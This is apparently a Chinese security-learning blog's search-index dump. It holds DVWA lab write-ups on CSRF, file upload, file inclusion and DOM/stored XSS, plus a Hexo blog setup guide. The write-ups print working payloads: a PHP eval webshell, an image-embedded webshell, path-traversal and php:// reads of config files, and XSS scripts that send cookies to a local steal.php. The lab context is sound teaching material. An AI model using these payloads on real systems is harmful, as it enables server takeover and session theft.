attack() &#123; document.getElementsByName(&apos;user_token&apos;)[0].value=document.getElementById(&apos;hack&apos;).contentWindow.document.getElementsByName(&apos;user_token&apos;)[0].value; document.getElementById(&apos;transfer&apos;).submit(); &#125;&lt;/script&gt;&lt;iframe src=&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/&quot; id=&apos;hack&apos; border=&apos;0&apos; style=&apos;display:none&apos;&gt;&lt;/iframe&gt;&lt;body onload=&quot;attack()&quot;&gt;&lt;form id=&quot;transfer&quot; method=&apos;get&apos; action=&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 然后在浏览器输入攻击页面url，跳转到修改密码的页面 可以看到成功获取token值并修改密码成功","categories":[{"name":"dvwa-CSRF","slug":"dvwa-CSRF","permalink":"https://Foxgrin.github.io/categories/dvwa-CSRF/"}],"tags":[{"name":"CSRF","slug":"CSRF","permalink":"https://Foxgrin.github.io/tags/CSRF/"}]},{"title":"使用Hexo+github搭建属于自己的博客","slug":"使用Hexo+github搭建属于自己的博客","date":"2018-07-12T11:53:00.000Z","updated":"2018-07-12T15:12:14.980Z","comments":true,"path":"/posts/29757/","link":"","permalink":"https://Foxgrin.github.io/posts/29757/","excerpt":"几个月以前，刚刚入门安全，看到了学长的博客，心里想着自己怎么这么low，还在用word记笔记，就一直想要有一个属于自己的博客，奈何时间有限，就一直把这个想法拖后，现在总算是迎来了假期，就下定了决心一定要做一个自己的博客，中间也碰到了无数的坑，无数次想放弃，但是最终在学长的耐心帮助下和不断的上网查询，总算是在今天搭完了自己的博客，并且把之前的笔记上传上来了，现在将我制作过程和碰到的问题及解决方案分享出来","text":"几个月以前，刚刚入门安全，看到了学长的博客，心里想着自己怎么这么low，还在用word记笔记，就一直想要有一个属于自己的博客，奈何时间有限，就一直把这个想法拖后，现在总算是迎来了假期，就下定了决心一定要做一个自己的博客，中间也碰到了无数的坑，无数次想放弃，但是最终在学长的耐心帮助下和不断的上网查询，总算是在今天搭完了自己的博客，并且把之前的笔记上传上来了，现在将我制作过程和碰到的问题及解决方案分享出来 前言在搭建博客之前，还想再多说几句，为什么要搭建自己的博客，在学习过程记笔记是很多人都有的习惯，记笔记的同时也是在整理复习自己学到的东西，实际上就是一个在给别人讲解的过程，很多东西表面上是学到了，但是过几天可能又忘了，记笔记不仅能把学到的总结一遍，在后面忘了的时候也可以再翻出来看，而在一开始的学习过程，我都是用word的形式记笔记，一方面这很low，一方面后面查看很不方便，而博客就很好的解决了这个问题，我们既可以按照自己的想法制作一个高大上的酷炫页面，也可以将自己的文章分类分标签和归档，日后查看明显就方便了很多，而且浏览效果也明显比word好很多，而且学长说过，在将来面试过程中，有一个自己的博客，也可以给自己加分。好了，废话不多说啦，下面马上将我制作博客的过程分享出来~ 开启github pages首先我们先注册一个github账号，登录后新建一个仓库 然后填写仓库的名称和描述，这里一定要注意仓库的名称的格式：你的用户名.github.io 描述属于可选项，填完点击创建仓库即可 然后点击Settings设置 然后往下拉，找到github pages，点击choose a theme选择主题 选择一款自己喜欢的主题（PS：这个可以先随便选，后面还可以更改） 这样，博客首页就做好了 可以先访问一下自己的博客，在浏览器输入 用户名.github.io访问 hexo环境搭建接下来就是用hexo丰富我们的博客主题 首先先安装git 再安装nodejs 两个安装都默认下一步就可以了 安装完成后，创建一个存放hexo组件的目录，我以blog目录为例说明，这个目录就是之后操作博客的目录 然后右键选择git bash here 然后在命令行中输入npm install hexo -g ，开始安装Hexo 输入hexo -v，检查hexo是否安装成功 输入hexo init，初始化文件夹，这里有点慢，可能要耐心等待 完成后显示Start blogging with Hexo这串提示就说明安装成功啦 输入npm install，安装所需要的组件 再将Hexo于Github page 联系起来，设置Git的user name 和email 上图中双引号中的内容替换成自己的用户名和邮箱 然后回到我们创建的存放博客的目录，这时候就发现多了许多目录和文件，在其中找到并打开_config.yml配置文件 来到配置文件的最下方 其中theme是主题的名字，这个我们后面在修改，首先修改#Deployment里面的内容，修改结果为： 上图应注意冒号后有一个空格 修改完成后保存 使用hexo s在本地4000端口开启服务（PS：这个命令很重要，一定要记住，之后我们修改博客都可以用这个命令先预览修改后的博客页面，之后再将改动更新到github上） 在浏览器输入127.0.0.1:4000访问博客主页 看到上图的页面就说明我们的环境已经基本准备好了 使用Hexo修改博客主题经过上面的各种环境搭建，我们的博客可算是基本成形了，接下来就是对博客进行装修，选择一个我们喜欢的主题 我们可以在hexo官方上选择我们喜欢的主题（PS：选择博客主题链接） 选择自己喜欢的主题后点击主题名进入发布人的github 这里以我的博客选择的主题为例 复制主题链接 然后回到blog目录下，找到并进入theme文件夹 右键选择git bash here 输入git clone +你选择的主题链接 下载所选主题 然后可以将主题文件夹名修改成较为简便好记的名字，这里修改成tomotoes 然后在blog目录下的_config.yml配置文件中，也就是刚才说的theme配置 修改成所选的主题名 然后在blog目录下打开git输入hexo s，本地预览效果 可见虽然主题更换了，但是一些css和js特效并没有显示出来，可能是这个主题需要特殊的一些配置文件，这时候我们就需要进入设计者的github主页中寻找接下来需要的设置 修改主题配置我们来到设计者的github页面，在主题下载链接下方会发现一个主题配置的要求 接下来就要仔细阅读这些要求，这里还是以我的主题为例 在Readme.md文件中有一些主题脚本或者css显示所需的配置安装 按照上面的配置命令逐一安装，这里就不一一说明了 安装完成后再次运行hexo s 再来看看页面 可以看出脚本效果都成功的加载出来了，接下来就是根据需求修改主题的配置了 首先我们还是来到blog文件夹下的_config.yml配置文件 在一开始的地方，我们可以修改一些博客的基本信息 各个配置说明如下： 1234567title: your titlesubtitle: your subtitledescription: your descriptionkeywords: your keywordsauthor: your nameemail: your emailurl: your site url 修改完成后，就可以修改我们下载的主题的配置文件了，同样在所选主题文件夹里找到_config.yml配置文件 这里可以根据官网上的说明修改，也不一一说明了 修改完成后，我们博客的基本布局信息都已经完成了 上传文章接下来我们就可以尝试上传文章了 这里需要注意的是我们所有上传的文章都要放在/blog/source/_posts目录下，且文章的格式都必须是md 下面是我上传的文章： 再简单的总结一下一些常用的md文件的格式： (1)文件开头： 1234567---title: xxxtags: xxxcategories: xxxdescription: xxxdate: 2018/7/12 22:00:00--- (2)文章摘要： 1xxx&lt;!--more--&gt; (3)图片插入： 1![](/img/1.png) （PS：在/blog/source目录下创建img文件夹，以后上传到文章的图片都保存在这里面） (4)http链接插入： 1[内容](https://) (5)代码区：三个` (6)标题设置： 1234567891011# 一阶标题 ##二阶标题 ###三阶标题 ####四阶标题 #####五阶标题 ######六阶标题 这里md文件的编写，我强烈推荐使用Typora编辑器 最后，一切改动完成后，在blog目录下打开git，输入hexo d –g命令将改动更新到github上即可 问题及解决方法(1)输入hexo d –g 提示找不到git 解决方法：输入npm install –save hexo-deployer-git (2)点击主页或者归档显示找不到页面 解决方法： 1)开启标签页： 1$ hexo new page tags 执行完成会发现/blog/source下面多了tags文件夹，里面有一个index.md文件，在文件头内容中添加： 12layout: tagscomments: false 2)开启分类页 1$ hexo new page categories 在index.md文件头内容中添加： 12layout: categoriescomments: false 3)开启关于页 1$ hexo new page about 在index.md文件头内容中添加： 123layout: aboutcomments: truereward: false PS：可能不同主题的配置命令不一样，具体参考主题官网 (3)关于设置文章唯一链接abbrlink，注意编写md文件时一定要确保未开启hexo s命令，否则会导致保存md文件后自动生成新的md文件，原来的内容全部都会消失 参考链接到这里博客就基本全部搭建完毕了，最后附上几个搭建的参考链接： (1)https://mochazz.github.io/2017/07/26/hexo-build/ (2)http://www.cnblogs.com/fengxiongZz/p/7707568.html (3)Typora使用参考手册:https://blog.csdn.net/SIMBA1949/article/details/79001226","categories":[{"name":"Hexo","slug":"Hexo","permalink":"https://Foxgrin.github.io/categories/Hexo/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://Foxgrin.github.io/tags/Hexo/"}]},{"title":"dvwa-file upload","slug":"dvwa-file-upload","date":"2018-07-12T08:27:00.000Z","updated":"2018-07-12T11:00:13.099Z","comments":true,"path":"/posts/40994/","link":"","permalink":"https://Foxgrin.github.io/posts/40994/","excerpt":"总结了dvwa中的文件上传漏洞关卡","text":"总结了dvwa中的文件上传漏洞关卡 Low代码复现如下： 1234567891011121314&lt;?phpif(isset($_POST[&apos;upload&apos;]))&#123; $target_path=&quot;C:/phpStudy/PHPTutorial/WWW/demo/file-upload/uploaded/&quot;; $target_path .= basename($_FILES[&apos;file&apos;][&apos;name&apos;]); if(!move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],$target_path))&#123; echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; &#125; else&#123; echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125;&#125;?&gt; 这部分内容涉及文件上传，我们先认识一下如何上传一个文件到服务器 表单标签部分： 123456789&lt;form action=\"\" method=\"post\" enctype=\"multipart/form-data\"&gt; &lt;p&gt;Choose an image to upload:&lt;/p&gt; &lt;p&gt; &lt;input type=\"file\" name=\"file\"&gt; &lt;/p&gt; &lt;p&gt; &lt;input type=\"submit\" name=\"upload\" value=\"upload\"&gt; &lt;/p&gt;&lt;/form&gt; 这里特别注意的是form标签中的entype属性规定了提交表单后如何对提交的数据进行编码，在表单需要提交二进制数据时，比如文件内容，要使用“multipart/form-data” 同时这里用了一个全局变量$_FILES 举个例子说明用法 1234567891011&lt;?phpif(isset($_POST[&apos;upload&apos;]))&#123; echo &apos;name:&apos;.$_FILES[&apos;file&apos;][&apos;name&apos;].&apos;&lt;br&gt;&apos;; echo &apos;type:&apos;.$_FILES[&apos;file&apos;][&apos;type&apos;].&apos;&lt;br&gt;&apos;; echo &apos;tmp_name:&apos;.$_FILES[&apos;file&apos;][&apos;tmp_name&apos;].&apos;&lt;br&gt;&apos;; echo &apos;size:&apos;.$_FILES[&apos;file&apos;][&apos;size&apos;].&apos;&lt;br&gt;&apos;; echo basename($_FILES[&apos;file&apos;][&apos;name&apos;]);&#125;?&gt; 这里需要注意服务器接受的POST参数是upload，全局变量$_FILES，代表了上传到服务器的文件信息 其中12345678$_FILES[‘file‘][‘name’] : 代表上传文件的名称$_FILES[‘file’][‘size’] : 代表上传文件的大小$_FILES[‘file’][‘tmp_name’] : 代表上传的文件存储的临时路径$_FILES[‘file’][‘type’] : 代表上传文件的类型 我们上传一个png文件试试 basename函数返回的是文件名，如果参数省略，则返回的文件名包含后缀 1echo basename($_FILES['file']['name'],'.png'); 如果过滤掉.png后缀名，则上传png文件是不会返回.png的后缀名 move_uploaded_file函数作用是将我们上传的文件从临时目录移动到指定目录下，成功返回true,失败则返回false 我们试着上传一个png文件 看出上传成功 由于这里对我们上传的文件没有任何的检查，过滤等操作，因此我们可以上传任意木马文件，得到webshell，这就是文件上传漏洞 我们上传一句话木马到服务器，文件名为test.php 一句话木马代码为： 1&lt;?php eval($_POST['apple']); ?&gt; 打开中国菜刀 输入文件名所在地，然后POST的参数名称为apple 然后菜刀就会向服务器发送包含apple参数的POST请求，最终获得服务器的webshell权限 Medium代码复现如下： 1234567891011121314151617181920212223&lt;?phpif(isset($_POST[&apos;upload&apos;]))&#123; $name=$_FILES[&apos;file&apos;][&apos;name&apos;]; $size=$_FILES[&apos;file&apos;][&apos;size&apos;]; $type=$_FILES[&apos;file&apos;][&apos;type&apos;]; if(($type == &quot;image/png&quot; || $type == &quot;image/jpeg&quot;) &amp;&amp; $size &lt; 100000)&#123; $target_path=&quot;C:/phpStudy/PHPTutorial/WWW/demo/file-upload/uploaded/&quot;; $target_path .= basename($name); if(!move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],$target_path))&#123; echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; &#125; else&#123; echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; else&#123; echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; &#125;&#125;?&gt; 这关对上传文件进行了一些过滤，可以看出只能上传jpg和png为后缀名的文件，并且文件大小不能超过100000B，因为我们上传的是一句话木马文件，所以不用担心文件大小超过限制，现在要考虑的是如何绕过后缀名的限制 我们先试着把一句话木马文件后缀名改为图片文件，然后上传 可以看到上传成功 那么我们打开中国菜刀，看看能不能获得webshell 获取webshell失败 可见图片文件是不行的，执行不了POST到服务器的命令 那么我们可以考虑用burp抓包，将文件名修改为test.php 可以看到我们上传的文件类型是png，是图片文件，符合条件上传成功，但是因为上传后图片就是png文件，所以菜刀POST到服务器的相关命令无法执行，所以我们要将上传成功后的文件名修改为php文件，这样就可以成功执行命令 成功上传，再上菜刀 成功获得webshell High代码复现如下： 123456789101112131415161718192021222324&lt;?phpif(isset($_POST[&apos;upload&apos;]))&#123; $name=$_FILES[&apos;file&apos;][&apos;name&apos;]; $tmp_name=$_FILES[&apos;file&apos;][&apos;tmp_name&apos;]; $size=$_FILES[&apos;file&apos;][&apos;size&apos;]; $txt=substr($name,strrpos($name,&apos;.&apos;)+1); if((strtolower($txt) == &apos;jpg&apos; || strtolower($txt) == &apos;jpeg&apos; || strtolower($txt) == &apos;png&apos;) &amp;&amp; $size &lt; 100000 &amp;&amp; getimagesize($tmp_name))&#123; $target_path=&quot;C:/phpStudy/PHPTutorial/WWW/demo/file-upload/uploaded/&quot;; $target_path .= basename($name); if(!move_uploaded_file($tmp_name,$target_path))&#123; echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; &#125; else&#123; echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; else&#123; echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; &#125;&#125;?&gt; 先了解几个函数 strpos：搜索字符串在另一字符串中第一次出现的位置（区分大小写） stripos：搜索字符串在另一字符串中第一次出现的位置（不区分大小写） strrpos：搜索字符串在另一字符串中最后一次出现的位置（区分大小写） strripos：搜索字符串在另一字符串中最后一次出现的位置（不区分大小写） 举个例子说明： 1234567891011&lt;?php$str=\"I love php,the greatest language is php.\";echo stripos($str,'PHP').\"&lt;br&gt;\";echo strpos($str,'PHP').\"&lt;br&gt;\";echo strrpos($str,'PHP').\"&lt;br&gt;\";echo strrpos($str,'php').\"&lt;br&gt;\";echo strripos($str,'PHP').\"&lt;br&gt;\";?&gt; 执行结果： 而getimagesize函数会检测上传文件头，如果不包含相关的图片文件头，则报错 也就是说我们上传的文件名后缀必须是jpg,jepg,png，而且文件头必须是图像类型 在上一关中，是对上传文件的类型进行检查，如果不是图片类型则过滤，所以我们可以用burpsuite将发向服务器的请求中的文件名改为.php的后缀，这样类型依然是图片，就能巧妙的绕过过滤 而这一关是对上传文件的名字进行了检查，名字的后缀必须是.jpg或者.png或者.jpeg，而且文件的头信息必须是图片，上一关的方法修改文件名明显行不通，也就是说我们必须老实上传一个图片文件 但是我们可以将php代码加入到图片中 我们先创建一个一句话木马文件和一个图片文件 再打开cmd，利用copy命令将两个文件合并为一个文件 打开合并后的文件可以看到，一句话木马被加到了最后 然后上传 成功通过检查 接下来打开菜刀 右键添加 http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file:///C:/phpStudy/PHPTutorial/WWW/dvwa/hackable/uploads/hack.jpg 参数名写apple，脚本语言选择php 成功拿到webshell","categories":[{"name":"dvwa-file upload","slug":"dvwa-file-upload","permalink":"https://Foxgrin.github.io/categories/dvwa-file-upload/"}],"tags":[{"name":"file upload","slug":"file-upload","permalink":"https://Foxgrin.github.io/tags/file-upload/"}]},{"title":"dvwa-file inclusion","slug":"dvwa-file-inclusion","date":"2018-07-11T14:16:00.000Z","updated":"2018-07-12T08:27:35.166Z","comments":true,"path":"/posts/13543/","link":"","permalink":"https://Foxgrin.github.io/posts/13543/","excerpt":"总结了dvwa中的文件包含漏洞的关卡","text":"总结了dvwa中的文件包含漏洞的关卡 Low代码复现如下： 12345678910&lt;?phpif(isset($_GET[&apos;page&apos;]))&#123; include($_GET[&apos;page&apos;]);&#125;else&#123; header(&quot;location:?page=include.php&quot;);&#125;?&gt; 从源代码可以看出，当用户没有GET一个page值时，会自动给page赋值一个include.php，而这个include.php中就包含了三个文件给用户选择，希望用户能点击这三个文件进行文件包含 但是从攻击者的角度来看，当然不会乖乖的去点击这三个文件，因为page参数是不经过过滤，我们可以读取我们想要读的文件，前提是文件存在对应的目录。 我们先要清楚，如果包含的是php文件，则正确包含，如果不是php文件，则原封不动的将文件内容输出到页面上 这里说的php文件不一定是后缀名是php的文件，任何后缀文件只要里面包含了符合php语法的语句，通过文件包含函数include后，里面合法的代码就会被执行 举个例子，我们先在目录中创建一个phpinfo.txt 文件内容是： 1&lt;?php phpinfo(); ?&gt; 然后给服务器GET一个page值为phpinfo.txt 发现正常显示phpinfo信息，由此可知，只要文件内容符合php语法规范，那么任何扩展名都可以被php解析 再将phpinfo.txt信息修改为非php语法规范的语句 同样给服务器GET一个page值为phpinfo.txt 发现暴露其源代码 所以我们可以利用这个特性，查看一些配置文件信息 首先要想查看文件信息，必定要弄清楚目录 我们先随便输入一个xxx.php 发现这个文件不存在，报错了，但同时把文件的绝对路径爆出来了 知道文件路径后，我们就可以查看一些配件文件，比如php配置信息 输入http://127.0.0.1/demo/file-inclusion/low.php?page=C:\\phpStudy\\PHPTutorial\\WWW\\dvwa/php.ini 或者输入../../../../../../../phpStudy/PHPTutorial/WWW/dvwa/php.ini 输入这么多的../是为了保证能回到根目录下 再看一下mysql配置信息 输入http://127.0.0.1/demo/file-inclusion/low.php?page=C:\\phpStudy\\PHPTutorial\\mysql\\my.ini 还可以使用php内置封装协议来读取php文件 输入?php://filter/read=convert.base64-encode/resource=include.php 发现一段被base64加密过后的php源代码，经过解密后就可以得到php文件原本的代码 再用php://input写入php命令，前提是allow_url_include选项要为on 在burpsuite中提交数据 发现提交的命令被执行了，那么是不是可以像xss一样提交恶意的脚本代码呢 我们提交 1&lt;script&gt;alert(‘xss’)&lt;/script&gt; 发现成功执行 我们再看看可不可以窃取cookie 输入 1&lt;?php echo\"&lt;script src='http://127.0.0.1/demo/xss(stored)/cookie.js'&gt;&lt;/script&gt;\" ?&gt; 发现成功跳转到steal.php 成功窃取到cookie值 Medium代码复现如下： 1234567891011121314&lt;?phpif(isset($_GET[&apos;page&apos;]))&#123; $page=$_GET[&apos;page&apos;]; $page=str_replace(array(&apos;http://&apos;,&apos;https://&apos;),&apos;&apos;,$page); $page=str_replace(array(&quot;../&quot;,&quot;..\\&quot;&quot;),&apos;&apos;,$page); //echo $page.&quot;&lt;br&gt;&quot;; include($page);&#125;else&#123; header(&quot;location:?page=include.php&quot;);&#125;?&gt; 可以看出对http:// 和https://，../和..\\有过滤，但是因为是str_replace函数，所以双写即可绕过 而且如果读取绝对路径的话，就没有什么影响 先看一下当前php文件的绝对路径 复写../构造路径读取php配置文件 读取mysql配置文件 使用php内置协议读取文件 任意命令执行 High代码复现如下： 123456789101112131415&lt;?phpif(isset($_GET[&apos;page&apos;]))&#123; $page=$_GET[&apos;page&apos;]; if(!fnmatch(&apos;file*&apos;,$page) &amp;&amp; $page != &apos;include.php&apos;)&#123; echo &quot;ERROR:File not found&quot;; exit; &#125; include($page);&#125;else&#123; header(&quot;location:?page=include.php&quot;);&#125;?&gt; Fnmatch函数作用是在page值中搜索指定模式，指定必须以file开头的字符串才返回true，而我们要执行include，就必须不让if语句执行，所以page值必须以file开头 看似完全限制了，但是我们可以用file协议进行读取文件","categories":[{"name":"dvwa-file inclusion","slug":"dvwa-file-inclusion","permalink":"https://Foxgrin.github.io/categories/dvwa-file-inclusion/"}],"tags":[{"name":"file inclusion","slug":"file-inclusion","permalink":"https://Foxgrin.github.io/tags/file-inclusion/"}]},{"title":"dvwa-xss(dom)","slug":"dvwa-xss(dom)","date":"2018-07-11T13:38:00.000Z","updated":"2018-07-11T14:11:08.637Z","comments":true,"path":"/posts/61192/","link":"","permalink":"https://Foxgrin.github.io/posts/61192/","excerpt":"总结了dvwa中的dom型xss关卡","text":"总结了dvwa中的dom型xss关卡 Low代码复现如下： 12345678910111213141516171819202122232425&lt;form name=&quot;XSS&quot; method=&quot;get&quot;&gt; &lt;p&gt;Please choose a language:&lt;/p&gt; &lt;select name=&quot;default&quot;&gt; &lt;script&gt; if(document.location.href.indexOf(&apos;default=&apos;)&gt;=0)&#123; var lang = document.location.href.substring(document.location.href.indexOf(&apos;default=&apos;)+8); document.write(&quot;&lt;option value=&apos;&quot;+lang+&quot;&apos;&gt;&quot;+decodeURI(lang)+&quot;&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;); &#125; document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;); &lt;/script&gt; &lt;/select&gt; &lt;input type=&apos;submit&apos; value=&apos;Select&apos;&gt;&lt;/form&gt;&lt;?phpsession_start();setcookie(&apos;security&apos;,&apos;low&apos;,time()+3600);?&gt; 这关没有php代码，但是我们可以仔细一步步分析js代码 首先明白几个对象： document:每个载入浏览器的html文档都会成为document对象 location:location对象包含了当前相关的url信息，href是location对象的属性，location.href能返回完整的URL 几个方法： indexOf：string.indexOf(searchvalue)返回搜索的子字符串在原字符串中第一次出现 的位置，如果搜索的字符串不存在，则返回-1 substring:string.substring(start，stop)提取字符串中介于两个指定下标之间的字符 从start处开始提取，到stop位置但不包括stop位置的字符，如果stop参数省略，则返回从start处开始到结束的字符 明白了这几个对象和方法后再来看这串js代码 If语句执行条件是检查url中是否含有’default=’这个字符串，如果有则执行if语句 也就是说if语句执行条件是必须通过GET方式传入一个default值才会执行if语句 执行之后定义一个变量lang，存储的是url中’default=’之后到结束的字符，也就是default的值 之后将lang进行url解码然后写入option标签中 这里没有php代码，也就是并没有与服务器交互，但是我们可以通过dom树解析js代码进行xss注入，也就是通过GET一个default值注入JS代码，然后执行if语句，就可以执行我们注入的JS代码，这就属于dom型的xss 于是我们输入default: 1&lt;script&gt;alert(“xss”)&lt;/script&gt; 果然出现了弹窗 接下来考虑窃取cookie值 按之前的方法利用ajax将cookie值传入steal.php，再将cookie值写入数据库 成功截取到cookie值 Medium代码复现如下： 12345678910111213141516171819202122232425262728293031&lt;form name=&quot;XSS&quot; method=&quot;get&quot;&gt; &lt;p&gt;Please choose a language:&lt;/p&gt; &lt;select name=&quot;default&quot;&gt; &lt;script&gt; if(document.location.href.indexOf(&quot;default=&quot;)&gt;=0)&#123; var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8); document.write(&quot;&lt;option value=&apos;&quot;+lang+&quot;&apos;&gt;&quot;+decodeURI(lang)+&quot;&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;); &#125; document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;); &lt;/script&gt; &lt;/select&gt; &lt;input type=&apos;submit&apos; value=&apos;Select&apos;&gt;&lt;/form&gt;&lt;?phpsession_start();setcookie(&apos;security&apos;,&apos;medium&apos;,time()+3600);if(array_key_exists(&apos;default&apos;,$_GET) &amp;&amp; $_GET[&apos;default&apos;] != NULL)&#123; if(stripos($_GET[&apos;default&apos;],&apos;&lt;script&apos;) !== false)&#123; header(&quot;location:?default=English&quot;); &#125;&#125;?&gt; 可以看出在服务器端对GET的default值进行了过滤，一旦检测到defalut值中含有&lt;script，就立刻重定向到default值为English的页面 解决方法是利用字符#，该字符后的数据不会发送到服务器端，从而绕过服务器的过滤，输入 1#default=&lt;script&gt;alert(“xss”)&lt;/script&gt; 在输入 1#default=&lt;script src=”http://127.0.0.1/demo/xss(stored)/cookie.js”&gt;&lt;/script&gt; 成功窃取到cookie值 还有一种方法就是通过触发onerror事件来执行js代码 输入 1&lt;img src=# onerror=(alert(”xss”))&gt; 但是发现并没有弹框，为什么呢，仔细看一下代码发现img标签是包含在option标签里面的，所以img标签并不会被解析 这里要闭合option标签和select标签才可以解析出img标签 输入 1&lt;/option&gt;&lt;/select&gt;&lt;img src=# onerror=(alert(‘xss’))&gt; 成功弹框 但是因为我们提前闭合了option和select标签，所以后面的select结构都会被破坏，整个页面结构都被破坏了，所以这种方法并不是很实用 再试试通过onerror事件执行ajax代码，将cookie值发送给steal.php，然后写入数据库 输入 1&lt;img src=# onerror='var url=\"http://127.0.0.1/demo/xss(reflected)/steal.php\";var postStr=\"data=\"+document.cook&amp;#x69;e;var ajax=null;&amp;#x69;f(w&amp;#x69;ndow.XMLHttpRequest)&#123;ajax=new XMLHttpRequest();&#125;else &amp;#x69;f(w&amp;#x69;ndow.Act&amp;#x69;veXObject)&#123;ajax=new Act&amp;#x69;veXObject(\"M&amp;#x69;crosoft.XMLHTTP\");&#125;else&#123;ajax=null;&#125;ajax.open(\"POST\", url, true);ajax.setRequestHeader(\"Content-Type\", \"appl&amp;#x69;cat&amp;#x69;on/x-www-form-urlencoded\");ajax.send(postStr);'&gt; 成功截取到cookie值 High代码复现如下： 123456789101112131415161718192021222324252627282930313233343536&lt;form name=&quot;XSS&quot; method=&quot;get&quot;&gt; &lt;p&gt;Please choose a language:&lt;/p&gt; &lt;select name=&quot;default&quot;&gt; &lt;script&gt; if(document.location.href.indexOf(&quot;default=&quot;)&gt;=0)&#123; var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8); document.write(&quot;&lt;option value=&apos;&quot;+lang+&quot;&apos;&gt;&quot;+decodeURI(lang)+&quot;&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;); &#125; document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;); &lt;/script&gt; &lt;/select&gt; &lt;input type=&apos;submit&apos; value=&apos;Select&apos;&gt;&lt;/form&gt;&lt;?phpsession_start();setcookie(&apos;security&apos;,&apos;high&apos;,time()+3600);if(array_key_exists(&apos;default&apos;,$_GET) &amp;&amp; $_GET[&apos;default&apos;] != NULL)&#123; $default=$_GET[&apos;default&apos;]; switch($default)&#123; case &apos;English&apos;:break; case &apos;French&apos;:break; case &apos;Spanish&apos;:break; case &apos;German&apos;:break; default:header(&quot;location:?default=English&quot;); &#125;&#125;?&gt; 可以看出default值如果不是选项中的四个值，就重定向到选项为English 跟上一关一样，依然可以采用字符#绕过过滤 输入 1?#default=&lt;script&gt;alert(“xss”)&lt;/script&gt; 成功弹框 输入 1?#default=&lt;script src=cookie.js&gt;&lt;/script&gt; 成功截取到cookie值","categories":[{"name":"dvwa-xss","slug":"dvwa-xss","permalink":"https://Foxgrin.github.io/categories/dvwa-xss/"}],"tags":[{"name":"xss","slug":"xss","permalink":"https://Foxgrin.github.io/tags/xss/"}]},{"title":"dvwa-xss(stored)","slug":"dvwa-xss(stored)","date":"2018-07-11T12:47:00.000Z","updated":"2018-07-11T13:33:57.097Z","comments":true,"path":"/posts/64824/","link":"","permalink":"https://Foxgrin.github.io/posts/64824/","excerpt":"总结了dvwa中的存储型xss关卡","text":"总结了dvwa中的存储型xss关卡 Low代码复现如下： 12345678910111213141516171819202122232425262728293031&lt;?phpsession_start();setcookie('security','low',time()+3600);include(\"../sql-connection.php\");if(isset($_POST['btnSign']))&#123; $name=trim($_POST['txtName']); $message=trim($_POST['mtxMessage']); $message=stripslashes($message); $message=mysql_real_escape_string($message); $name=mysql_real_escape_string($name); $sql=\"INSERT INTO guestbook (comment,name) VALUES ('$message','$name')\"; $result=mysql_query($sql) or die(mysql_error());&#125;if(isset($_POST['btnClear']))&#123; $sql=\"DELETE FROM guestbook\"; $result=mysql_query($sql);&#125;$sql=\"SELECT name,comment FROM guestbook\";$result=mysql_query($sql);while($row=mysql_fetch_assoc($result))&#123; echo \"Name:\".$row['name'].\"&lt;br&gt;\"; echo \"Message:\".$row['comment'].\"&lt;br&gt;\";&#125;mysql_close();?&gt; 从代码可以看出将我们POST的name和message写入数据库，并且原原本本的输出存入数据库的name和message，所以很明显存在xss漏洞，这种属于存储型的xss，先将恶意脚本代码存入数据库中，然后用户每次访问网页时都会执行一次恶意代码 我们在name中输入 1&lt;script&gt;alert(“xss”)&lt;/script&gt; 再次刷新页面依然会跳出提示框 那么我们再按反射型xss关卡中的通过存入 1&lt;script src=”http://127.0.0.1/demo/xss(reflected)/cookie.js”&gt;&lt;/script&gt; 来跳转到steal.php 再将cookie值存入数据库的方法试一下 发现成功写入cookie值 